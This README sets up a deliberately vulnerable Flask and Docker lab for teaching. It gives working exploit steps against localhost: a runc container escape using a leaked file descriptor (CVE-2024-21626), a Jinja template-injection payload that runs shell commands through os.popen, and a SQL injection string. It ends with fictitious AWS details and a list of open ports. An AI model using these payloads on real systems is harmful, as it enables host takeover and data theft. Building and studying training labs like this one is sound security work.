# Project 1: RCE & Container Escape

This project is a simple Python Flask application designed to be vulnerable for educational purposes. It demonstrates vulnerabilities at both the application and infrastructure levels.

### Vulnerabilities Included:

1.  **`runc` Container Escape (CVE-2024-21626):** A high-severity vulnerability in `runc` that allows a malicious container to break out of its isolation and gain root access on the host machine.
2.  **Peering Manager-style SSTI RCE (CVE-2024-28114):** A critical Server-Side Template Injection (SSTI) that allows an attacker to execute arbitrary commands on the server through a malicious template.
3.  **SQL Injection (Generic):** A classic web vulnerability allowing an attacker to manipulate SQL queries to exfiltrate data from the database.

---

### How to Run

**Prerequisites:**
*   Docker
*   Docker Compose
*   **For CVE-2024-21626:** A host system with a vulnerable version of `runc` (e.g., versions `< 1.1.12`). Most default Docker installations on Linux from before February 2024 are vulnerable.

**Instructions:**

1.  Clone or download this project directory.
2.  Navigate to the `project1` directory in your terminal.
3.  Run the following command to build and start the services in the background:

    ```bash
    docker-compose up --build -d
    ```

4.  The vulnerable web application will be available at **http://localhost:5001**.
5.  The `project1_exploit_pod` container will be running for you to execute commands from.

---

### How to Exploit

#### 1. runc Container Escape (CVE-2024-21626)

This exploit works by tricking the host's `runc` process into keeping a file descriptor open to the host's filesystem, which the container can then use to "escape".

**Note:** This command must be run from your **host machine's terminal**, not from inside a container.

```bash
# This command executes `ls -l /` inside the exploit_pod container,
# but it tricks runc into evaluating the working directory (`-w`) from a leaked
# host file descriptor, effectively listing the root of the HOST filesystem.
docker exec -w /proc/self/fd/7 project1_exploit_pod ls -l /
```
You should see the contents of your host machine's root directory (/), not the container's.
#### 2. Peering Manager-style SSTI RCE (CVE-2024-28114)
1. Open your browser and navigate to http://localhost:5001.
2. In the "SSTI RCE" section, you can use curl or the web form.
Using curl:
```bash
curl -X POST http://localhost:5001/render \
-d "template={{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
```

Expected Output: You will see the output of the id command from within the project1_app container (e.g., uid=0(root) gid=0(root) groups=0(root)).

#### 3. SQL Injection
1. Navigate to http://localhost:5001.
2. In the "SQL Injection" section, enter the following payload into the search box and click "Search User":
```bash
' OR '1'='1
```
3. Alternatively, you can craft the URL directly: http://localhost:5001/search?query=%27%20OR%20%271%27=%271

Expected Result: The query becomes SELECT username FROM users WHERE username = '' OR '1'='1', which is always true. The application will return all usernames from the database (admin and alice).

### To Stop and Clean Up
Run the following command in the project1 directory to stop and remove the containers and network:
```bash
docker-compose down 
```

### Fake Infrastructure Details

*   **`cloud_provider`**: AWS
*   **`services_used`**: ["EC2", "RDS for PostgreSQL", "S3", "Elastic Load Balancer"]
*   **`authentication_method`**: IAM Roles for service-to-service communication. Application database uses local user accounts.
*   **`region`**: us-east-1
*   **`extra_info`**: "Application is behind an ELB. Static assets are served from an S3 bucket. CI/CD pipeline is managed by Jenkins running on a separate EC2 instance."

### Fake Open Ports

| Port  | Service    | Description                                   |
| :---- | :--------- | :-------------------------------------------- |
| 80/443| HTTP/HTTPS | Standard web traffic, forwarded by ELB to app |
| 22    | SSH        | Restricted to admin jump-box for maintenance  |
| 5432  | PostgreSQL | DB port, only accessible from app server SG   |
| 9100  | Monitoring | Node Exporter endpoint for Prometheus metrics |